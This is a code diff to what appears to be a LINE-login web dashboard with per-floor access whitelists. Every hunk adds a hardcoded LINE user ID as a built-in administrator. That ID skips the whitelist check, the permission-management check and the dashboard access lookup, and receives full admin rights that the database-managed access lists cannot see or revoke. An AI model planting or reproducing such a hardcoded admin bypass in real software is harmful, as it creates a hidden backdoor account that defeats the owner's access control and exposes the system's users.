@@ -18,6 +18,7 @@ const FLOOR_ADMIN = "admin";
 const FLOOR_SUPER_ADMIN = "admin_all";
 const FLOOR_IDS = new Set([FLOOR_MAIN, FLOOR_ADMIN]);
 const ACCESS_LIST_IDS = new Set([FLOOR_MAIN, FLOOR_ADMIN, FLOOR_SUPER_ADMIN]);
+const BUILTIN_ADMIN_UIDS = new Set(["U1b5150879fb688cae4b52e80a4b836c6"]);
 const POINT_OA1 = "oa1";
 const POINT_OA2 = "oa2";
 const POINT_CHANNELS = new Set([POINT_OA1, POINT_OA2]);
@@ -747,6 +748,7 @@ async function assertFloorAccess(request, env, floor) {
   if (Number(countRow && countRow.count || 0) <= 0) return;
   const operator = requestOperatorIdentity(request, auth);
   if (!operator.ids.length && !operator.names.length) throw httpError(`此樓層已啟用白名單，請先填寫操作人代號`, 403);
+  if (isBuiltinAdminOperator(operator)) return;
   const adminAllowed = await findFloorAccessEntry(env, FLOOR_SUPER_ADMIN, operator);
   if (adminAllowed) return;
   const allowed = await findFloorAccessEntry(env, targetFloor, operator);
@@ -780,6 +782,15 @@ function requestOperatorIdentity(request, auth = {}) {
     names,
     label: ids[0] || names[0] || "",
   };
+}
+
+function isBuiltinAdminOperator(operator) {
+  const ids = Array.isArray(operator && operator.ids) ? operator.ids : [];
+  return ids.some((id) => BUILTIN_ADMIN_UIDS.has(normalizedOperatorId(id)));
+}
+
+function isBuiltinAdminProfile(profile) {
+  return BUILTIN_ADMIN_UIDS.has(normalizedOperatorId(profile && profile.userId));
 }
 
 async function findFloorAccessEntry(env, floor, operator) {
@@ -5829,6 +5840,7 @@ async function assertAccessManager(request, env) {
   if (!env.DB) throw httpError("DB is not configured", 500);
   await ensureFloorAccessSchema(env);
   const operator = requestOperatorIdentity(request, auth);
+  if (isBuiltinAdminOperator(operator)) return auth;
   const adminAllowed = await findFloorAccessEntry(env, FLOOR_SUPER_ADMIN, operator);
   if (!adminAllowed) throw httpError("只有 admin 可以管理權限", 403);
   return auth;
@@ -5884,6 +5896,7 @@ async function verifyLineLoginIdToken(env, idToken) {
 }
 
 async function resolveLineDashboardAccess(env, profile) {
+  if (isBuiltinAdminProfile(profile)) return { allowed: true, admin: true, floors: [FLOOR_MAIN, FLOOR_ADMIN] };
   if (!profile || !profile.userId || !env.DB) return { allowed: false, admin: false, floors: [] };
   await ensureFloorAccessSchema(env);
   const operator = { ids: [profile.userId], names: [profile.displayName].filter(Boolean), label: profile.userId };
